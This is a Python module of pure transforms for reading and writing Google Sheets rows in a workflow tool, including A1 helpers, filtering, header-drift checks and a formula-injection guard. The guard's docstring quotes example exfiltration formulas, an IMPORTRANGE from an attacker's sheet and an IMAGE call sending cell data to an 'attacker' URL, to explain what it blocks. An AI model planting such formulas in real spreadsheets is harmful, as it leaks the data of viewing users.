"""Pure transforms behind a sheet binding.  No I/O, no network, stdlib only.

The Sheets API calls live in the data source layer (the executor, with the
impersonated Google credential).  Everything *between* those calls — turning a
grid of cells into records, filtering them, finding a row by key, composing the
ranges a write consists of — is arithmetic over lists and dicts and lives here.

Two reasons for the split:

1. It is the part worth testing exhaustively, and it can be, because it takes
   values in and gives values out.
2. It has to be runnable inside the existing seccomp sandbox
   (``app.infrastructure.orchestration.script_sandbox``), which has no network,
   no filesystem and no third-party imports.  So this module imports nothing
   but the standard library and defines no module-level state — which is what
   lets ``sheet_binding_library`` ship its source verbatim into a script-library
   entry that a ``python`` workflow step can call.

Nothing here executes a binding field.  A binding is user-authored *data*: the
functions below read it, they never ``eval`` or ``exec`` any part of it.
"""
from __future__ import annotations

import hashlib
import json
from typing import Any

# Sheets' A1 notation is base-26 with no zero: A..Z, then AA..AZ, BA..
_A1_ALPHABET_SIZE = 26


class SheetBindingError(Exception):
    """A binding could not be resolved against the sheet as it is now.

    Distinct from a validation error at save time: this one is raised mid-run,
    and its message is what a person reads in a failed run, so it says what
    changed and what to do about it rather than naming a field.
    """


# ---------------------------------------------------------------------------
# A1 helpers
# ---------------------------------------------------------------------------

def sheets_column_letter(index: int) -> str:
    """0-based column index -> A1 column letter(s).  0 -> 'A', 26 -> 'AA'."""
    if index < 0:
        raise SheetBindingError(f"column index {index} is negative")
    letters = ""
    remaining = index
    while True:
        remaining, rest = divmod(remaining, _A1_ALPHABET_SIZE)
        letters = chr(ord("A") + rest) + letters
        if remaining == 0:
            break
        remaining -= 1
    return letters


def sheets_quote_sheet_title(title: str) -> str:
    """Quote a tab title for A1 notation when it needs it.

    A title with a space, a quote or a punctuation character is ambiguous
    unquoted ("Q1 2026!A1" parses as nonsense), and Sheets' own escaping for a
    single quote inside a quoted title is to double it.
    """
    if title and title.replace("_", "").isalnum():
        return title
    return "'" + title.replace("'", "''") + "'"


def sheets_a1_range(title: str, start: str, end: str = "") -> str:
    """``'My Tab'!A1:D20`` from a tab title and cell references."""
    cells = f"{start}:{end}" if end else start
    return f"{sheets_quote_sheet_title(title)}!{cells}"


# ---------------------------------------------------------------------------
# The grid
# ---------------------------------------------------------------------------

def sheets_rows_to_records(values: Any, headers: list[str]) -> list[dict[str, Any]]:
    """Zip a Sheets value grid onto *headers*, padding every row first.

    **The padding is the point.**  The Sheets API truncates trailing empty
    cells: a sheet with five columns hands back ``[["a","b","c","d","e"],
    ["a","b"]]`` for a row whose last three cells are blank — the row is simply
    shorter, with no marker of where it stopped.  Anything that zips headers
    against un-padded rows either raises IndexError on the short ones or, worse,
    silently shifts values into the wrong columns for every row that happens to
    be short.  That is a data-corruption bug that looks like nothing until
    somebody reads the sheet.

    So every row is padded to ``len(headers)`` with ``""`` before zipping, and a
    row *longer* than the headers has its surplus dropped (a stray value in an
    unheadered column is not a field of the record).

    ``values`` is the grid **below** the header row — the caller slices the
    header row off first, because the header row is not a record.
    """
    width = len(headers)
    records: list[dict[str, Any]] = []
    for row in values or []:
        cells = list(row or [])
        if len(cells) < width:
            cells = cells + [""] * (width - len(cells))
        records.append({headers[i]: cells[i] for i in range(width)})
    return records


def sheets_check_fingerprint(headers: Any, expected_fingerprint: str) -> None:
    """Raise unless *headers* still hash to *expected_fingerprint*.

    Called immediately before a read is projected and before a write is built,
    never once per run: the check is only worth anything if it covers the same
    header row the very next operation resolves columns against.

    There is deliberately **no** fallback.  A mismatch means a column was
    inserted, removed or reordered since the binding was authored, so every
    column position in it is suspect — and "write by position anyway" is how a
    sheet quietly accumulates months of values in the wrong column.  Failing
    the run is recoverable; that is not.
    """
    if not expected_fingerprint:
        raise SheetBindingError(
            "this binding has no header fingerprint, so drift cannot be "
            "detected — re-probe the sheet and save the binding again"
        )
    actual_headers = [str(h) for h in (headers or [])]
    canonical = json.dumps(actual_headers, ensure_ascii=False, separators=(",", ":"))
    actual = "sha256:" + hashlib.sha256(canonical.encode("utf-8")).hexdigest()
    if actual != expected_fingerprint:
        raise SheetBindingError(
            "the sheet's header row has changed since this binding was saved, "
            "so its columns can no longer be trusted. Headers now: "
            f"{', '.join(repr(h) for h in actual_headers) or '(none)'}. "
            "Open the binding, probe the sheet again, check the column "
            "mappings and save it. (Nothing was read or written.)"
        )


# ---------------------------------------------------------------------------
# Tagged values
# ---------------------------------------------------------------------------

def sheets_resolve_tagged(value: Any, params: dict[str, Any] | None = None) -> Any:
    """Resolve one ``{"literal": …}`` / ``{"from": "<path>"}`` value.

    A ``literal`` is returned exactly as authored — never templated, so braces
    in it are just braces.  A ``from`` is looked up in *params*, which the
    caller has already keyed by state path (the compiled operation's params are
    built from the same paths, so there is one mapping and not two).  A value
    that is neither tag is passed through, which is what lets a caller
    pre-resolve a filter tree and hand it to the pure filter below.
    """
    if isinstance(value, dict):
        if "from" in value and value.get("from"):
            path = value["from"]
            lookup = params or {}
            if path not in lookup:
                raise SheetBindingError(
                    f"no value was supplied for '{path}', which this binding "
                    "reads from workflow state"
                )
            return lookup[path]
        if "literal" in value:
            return value["literal"]
    return value


# ---------------------------------------------------------------------------
# Filtering
# ---------------------------------------------------------------------------

def _compare(left: Any, op: str, right: Any) -> bool:
    """One clause, on values that may not be the same type.

    Cells come back as whatever Sheets decided they are — a number, a string, a
    bool — while a literal in a binding is whatever the author typed in a form
    (usually a string).  Ordering comparisons try numbers first and fall back to
    a string comparison, and equality compares as strings when the raw types
    disagree, so ``status eq "open"`` matches a cell holding ``open`` and
    ``limit gt "5"`` matches a cell holding ``6``.  Both are what a person means
    by those forms; failing them on a type mismatch would only ever surprise.
    """
    if op == "eq":
        return left == right or _as_text(left) == _as_text(right)
    if op == "ne":
        return not (left == right or _as_text(left) == _as_text(right))
    if op == "in":
        if isinstance(right, (list, tuple, set)):
            texts = {_as_text(item) for item in right}
            return left in right or _as_text(left) in texts
        return _as_text(right) != "" and _as_text(left) in _as_text(right)
    if op == "contains":
        if isinstance(left, (list, tuple, set)):
            return right in left or _as_text(right) in {_as_text(i) for i in left}
        return _as_text(right) in _as_text(left)
    if op in ("lt", "lte", "gt", "gte"):
        pair = _as_number_pair(left, right)
        if pair is None:
            pair = (_as_text(left), _as_text(right))
        first, second = pair
        if op == "lt":
            return first < second
        if op == "lte":
            return first <= second
        if op == "gt":
            return first > second
        return first >= second
    raise SheetBindingError(f"unknown filter operator '{op}'")


def _as_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bool):
        return "TRUE" if value else "FALSE"
    return str(value)


def _as_number_pair(left: Any, right: Any) -> tuple[float, float] | None:
    try:
        return float(str(left).strip()), float(str(right).strip())
    except (TypeError, ValueError):
        return None


def sheets_match_record(
    record: dict[str, Any],
    filter_spec: Any,
    params: dict[str, Any] | None = None,
) -> bool:
    """Whether one record satisfies a filter group.

    An empty group matches everything: a filter the author left blank should
    not silently drop every row.  (``validate_binding`` refuses to *save* an
    empty group, so this only arises for a filter built in code.)
    """
    if not filter_spec:
        return True
    op = (filter_spec.get("op") or "and").lower()
    clauses = filter_spec.get("clauses") or []
    if not clauses:
        return True
    results = []
    for clause in clauses:
        if "clauses" in clause:
            results.append(sheets_match_record(record, clause, params))
            continue
        column = clause.get("column")
        if column not in record:
            raise SheetBindingError(
                f"filter references column '{column}', which the sheet does not have"
            )
        wanted = sheets_resolve_tagged(clause.get("value"), params)
        results.append(_compare(record[column], clause.get("op") or "eq", wanted))
    return all(results) if op == "and" else any(results)


def sheets_filter_records(
    records: list[dict[str, Any]],
    filter_spec: Any,
    params: dict[str, Any] | None = None,
) -> list[dict[str, Any]]:
    """The records matching *filter_spec* (an ``and``/``or`` clause tree)."""
    if not filter_spec:
        return list(records)
    return [r for r in records if sheets_match_record(r, filter_spec, params)]


def sheets_project_records(
    records: list[dict[str, Any]], columns: list[str]
) -> list[dict[str, Any]]:
    """Keep only *columns*, in the order the binding names them."""
    if not columns:
        return list(records)
    return [{c: r.get(c, "") for c in columns} for r in records]


# ---------------------------------------------------------------------------
# Row lookup
# ---------------------------------------------------------------------------

def sheets_resolve_row(
    values: Any,
    key_column: str,
    key_value: Any,
    header_row: int = 1,
) -> int | None:
    """1-based sheet row number of the first row where *key_column* matches.

    ``values`` is the grid **including** its header row, as read starting at
    ``header_row``: ``values[0]`` is the header row itself, sitting on sheet row
    ``header_row``, so data row *i* is on sheet row ``header_row + 1 + i``.

    Returns ``None`` when no row matches — the caller decides what that means
    (``on_missing``).  Comparison is the same lenient equality the filter uses,
    because a key typed into a form is a string and the cell holding it may be
    a number.

    The returned number is only valid for as long as nobody inserts or deletes
    a row above it, which is why it is resolved in the same execution as the
    write that uses it and never carried across steps.
    """
    grid = list(values or [])
    if not grid:
        return None
    headers = [str(h) for h in (grid[0] or [])]
    if key_column not in headers:
        raise SheetBindingError(
            f"key column '{key_column}' is not in the sheet's header row "
            f"({', '.join(repr(h) for h in headers) or 'empty'})"
        )
    index = headers.index(key_column)
    for offset, row in enumerate(grid[1:]):
        cells = list(row or [])
        cell = cells[index] if index < len(cells) else ""
        if _compare(cell, "eq", key_value):
            return header_row + 1 + offset
    return None


def sheets_next_row(values: Any, header_row: int = 1) -> int:
    """The first empty sheet row below the data, for an append."""
    grid = list(values or [])
    return header_row + max(len(grid), 1)


# ---------------------------------------------------------------------------
# Formula guard
# ---------------------------------------------------------------------------

# Leading characters Sheets treats as "this is an expression, not text" when it
# parses a value under USER_ENTERED.
FORMULA_LEAD_CHARS = ("=", "+", "-", "@")


def sheets_guard_formula(value: Any, value_input_option: str, allow_formulas: bool) -> Any:
    """Neutralise a value that would become a live formula, unless opted in.

    SECURITY.  Under ``USER_ENTERED`` Sheets parses the cell the way typing it
    would, so a value beginning with ``=`` (or ``+``, ``-``, ``@``, which
    spreadsheets also treat as formula leads) becomes an executable expression.
    The values a binding writes come from workflow state — a ticket body, an
    email, an LLM's output — so ``=IMPORTRANGE("<attacker's sheet>","A1")`` or
    ``=IMAGE("https://attacker/?d="&A1)`` landing in a cell executes with the
    *viewing* user's permissions and exfiltrates whatever that user can read.
    The document owner never approved anything; they just opened their sheet.

    A leading apostrophe is Sheets' own "store this as text" marker: it is not
    part of the stored value and does not show in the cell.  ``RAW`` needs no
    guard at all — nothing is parsed — and ``allow_formulas`` is the explicit
    opt-out for a binding whose author is deliberately writing formulas.
    """
    if value_input_option != "USER_ENTERED" or allow_formulas:
        return value
    if isinstance(value, str) and value[:1] in FORMULA_LEAD_CHARS:
        return "'" + value
    return value


# ---------------------------------------------------------------------------
# Building a write
# ---------------------------------------------------------------------------

def sheets_build_write(
    binding: dict[str, Any],
    resolved_values: dict[str, Any],
    row_number: int | None,
) -> dict[str, Any]:
    """Compose the API payload for a write binding.

    *binding* is the binding as a plain dict, *resolved_values* maps column name
    to the value already resolved from state (or, for ``set_cells``, range
    string to value), and *row_number* is the 1-based sheet row a
    ``update_by_key`` write targets (``None`` for an append).

    Returns ``{"mode", "data", "values", "cells"}``:

    ``data``
        ``[{range, values}]`` entries for ``batch_update_values`` — one entry
        per contiguous run of columns, so a write to two adjacent columns costs
        one range instead of two.
    ``values``
        A single row for ``append_values``, wide enough to place each named
        column at its own index and ``""`` elsewhere.
    ``cells``
        ``[{a1, column, value, action}]`` — the same write described cell by
        cell, which is what the preview and the approval gate render.  ``action``
        is ``"write"`` or ``"skip"`` (``blank_policy: "skip"`` left it alone).

    A column absent from ``binding["write"]["columns"]`` never appears here, in
    any of the three: that is the invariant that makes a write safe to run
    against a sheet people are editing at the same time.
    """
    write = binding.get("write") or {}
    headers = list(((binding.get("schema") or binding.get("sheet_schema") or {}).get("headers")) or [])
    title = ((binding.get("document") or {}).get("sheet")) or ""
    mode = write.get("mode") or "update_by_key"
    option = write.get("value_input_option") or "RAW"
    allow_formulas = bool(write.get("allow_formulas"))
    blank_policy = write.get("blank_policy") or "skip"

    if mode == "set_cells":
        return _build_set_cells(write, resolved_values, option, allow_formulas, blank_policy)

    columns = write.get("columns") or {}
    # Only the named columns, ordered by their position in the sheet so the
    # ranges below come out left to right.
    placements: list[tuple[int, str, Any, str]] = []
    for name in columns:
        if name not in headers:
            raise SheetBindingError(
                f"write names column '{name}', which the sheet does not have"
            )
        value = resolved_values.get(name)
        blank = value is None or value == ""
        if blank and blank_policy == "skip":
            placements.append((headers.index(name), name, value, "skip"))
            continue
        cell_value = "" if blank else sheets_guard_formula(value, option, allow_formulas)
        placements.append((headers.index(name), name, cell_value, "write"))
    placements.sort(key=lambda item: item[0])

    if mode == "append_row":
        return _build_append(placements, headers, title, blank_policy)
    return _build_update(placements, title, row_number)


def _build_update(
    placements: list[tuple[int, str, Any, str]],
    title: str,
    row_number: int | None,
) -> dict[str, Any]:
    if row_number is None or row_number < 1:
        raise SheetBindingError(
            "no sheet row was resolved for this write — the row lookup has to "
            "run in the same execution as the write"
        )
    written = [p for p in placements if p[3] == "write"]
    cells = [
        {
            "a1": sheets_a1_range(title, f"{sheets_column_letter(index)}{row_number}"),
            "column": name,
            "value": value,
            "action": action,
        }
        for index, name, value, action in placements
    ]
    data: list[dict[str, Any]] = []
    # Group adjacent columns into one range: consecutive indices share a range,
    # a gap (or a skipped column) starts a new one. A skipped column must break
    # the run — writing across it would overwrite the cell the skip protected.
    run: list[tuple[int, str, Any, str]] = []
    for placement in placements:
        if placement[3] != "write":
            if run:
                data.append(_range_entry(title, run, row_number))
                run = []
            continue
        if run and placement[0] == run[-1][0] + 1:
            run.append(placement)
        else:
            if run:
                data.append(_range_entry(title, run, row_number))
            run = [placement]
    if run:
        data.append(_range_entry(title, run, row_number))
    return {
        "mode": "update_by_key",
        "row_number": row_number,
        "data": data,
        "values": None,
        "cells": cells,
        "written_columns": [name for _, name, _, _ in written],
    }


def _range_entry(
    title: str, run: list[tuple[int, str, Any, str]], row_number: int
) -> dict[str, Any]:
    start = sheets_column_letter(run[0][0]) + str(row_number)
    end = sheets_column_letter(run[-1][0]) + str(row_number)
    return {
        "range": sheets_a1_range(title, start, end if end != start else ""),
        "values": [[value for _, _, value, _ in run]],
    }


def _build_append(
    placements: list[tuple[int, str, Any, str]],
    headers: list[str],
    title: str,
    blank_policy: str,
) -> dict[str, Any]:
    """One row, values placed at their column indices.

    An append cannot "leave a cell alone" — the row does not exist yet, so
    every cell of it is written.  A column the binding does not name comes out
    empty, and so does one whose value was blank under ``blank_policy: skip``:
    there is nothing there to preserve.
    """
    if not placements:
        raise SheetBindingError("this write names no columns, so there is nothing to append")
    width = max(index for index, _, _, _ in placements) + 1
    row: list[Any] = [""] * width
    for index, _name, value, action in placements:
        row[index] = "" if action == "skip" else value
    cells = [
        {
            "a1": sheets_a1_range(title, f"{sheets_column_letter(index)}<new row>"),
            "column": name,
            "value": "" if action == "skip" else value,
            "action": "write",
        }
        for index, name, value, action in placements
    ]
    return {
        "mode": "append_row",
        "row_number": None,
        # The append endpoint is given the whole table's range and finds the
        # first free row itself, so there is no range to compute here.
        "data": None,
        "values": [row],
        "cells": cells,
        "written_columns": [name for _, name, _, _ in placements],
    }


def _build_set_cells(
    write: dict[str, Any],
    resolved_values: dict[str, Any],
    option: str,
    allow_formulas: bool,
    blank_policy: str,
) -> dict[str, Any]:
    data: list[dict[str, Any]] = []
    cells: list[dict[str, Any]] = []
    for entry in write.get("cells") or []:
        target = entry.get("range") or {}
        rendered = target.get("named_range") or target.get("a1") or ""
        if not rendered:
            raise SheetBindingError("a set_cells entry has no range")
        value = resolved_values.get(rendered)
        blank = value is None or value == ""
        if blank and blank_policy == "skip":
            cells.append({"a1": rendered, "column": None, "value": value, "action": "skip"})
            continue
        cell_value = "" if blank else sheets_guard_formula(value, option, allow_formulas)
        data.append({"range": rendered, "values": [[cell_value]]})
        cells.append({"a1": rendered, "column": None, "value": cell_value, "action": "write"})
    return {
        "mode": "set_cells",
        "row_number": None,
        "data": data,
        "values": None,
        "cells": cells,
        "written_columns": [],
    }
